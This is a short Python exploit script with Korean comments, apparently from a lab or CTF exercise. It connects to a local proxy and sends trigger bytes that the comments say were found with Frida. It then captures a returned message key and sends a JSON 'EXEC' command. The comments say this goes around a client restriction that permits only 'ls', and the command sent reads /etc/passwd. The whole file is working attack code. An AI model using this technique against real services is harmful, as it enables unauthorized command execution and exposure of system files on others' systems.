import socket
import json
import time

# 1. 대상 정보 (로컬 프록시)
TARGET_IP = "127.0.0.1"
TARGET_PORT = 10000

def exploit():
    try:
        # 소켓 연결
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_IP, TARGET_PORT))
        print(f"[+] Connected to {TARGET_IP}:{TARGET_PORT}")

        # ---------------------------------------------------------
        # Step 1: 초기 트리거 바이트 전송 (Frida에서 본 그 값!)
        # 예: 0x01 0x00 0x00 0x00 (4바이트)라고 가정
        # ---------------------------------------------------------
        trigger_bytes = b'\x01\x00\x00\x00' 
        sock.send(trigger_bytes)
        print(f"[+] Sent trigger bytes: {trigger_bytes.hex()}")

        # ---------------------------------------------------------
        # Step 2: messageKey 수신
        # ---------------------------------------------------------
        response = sock.recv(1024)
        print(f"[+] Received raw data: {response}")
        
        # 만약 응답이 JSON이라면 파싱, 텍스트라면 그대로 사용
        # 여기서는 단순 텍스트 키라고 가정 (예: "SESSION_ID_X99")
        message_key = response.decode('utf-8', errors='ignore').strip()
        print(f"[!] Extracted Key: {message_key}")

        # ---------------------------------------------------------
        # Step 3: JSON 구성 및 명령 전송 (제약 우회)
        # ---------------------------------------------------------
        # 원래 클라이언트는 "ls"만 허용하지만, 나는 "cat /etc/passwd"를 보낸다!
        payload = {
            "msgKey": message_key,
            "command": "cat /etc/passwd",
            "type": "EXEC"
        }
        
        json_payload = json.dumps(payload)
        sock.send(json_payload.encode('utf-8'))
        print(f"[+] Sent Payload: {json_payload}")

        # ---------------------------------------------------------
        # Step 4: 결과 확인
        # ---------------------------------------------------------
        result = sock.recv(4096)
        print("[+] Result from Server:\n", result.decode())

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    exploit()
